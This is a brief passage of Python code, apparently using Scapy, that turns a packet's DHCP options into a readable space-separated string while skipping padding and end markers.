    if DHCP not in pkt:
        return ""
    parts: list[str] = []
    for o in pkt[DHCP].options:
        if isinstance(o, str):
            if o in ("end", "pad"):
                continue
            parts.append(o)
        elif isinstance(o, tuple):
            val = o[1] if len(o) == 2 else list(o[1:])
            parts.append(f"{o[0]}={val}")
    return " ".join(parts)
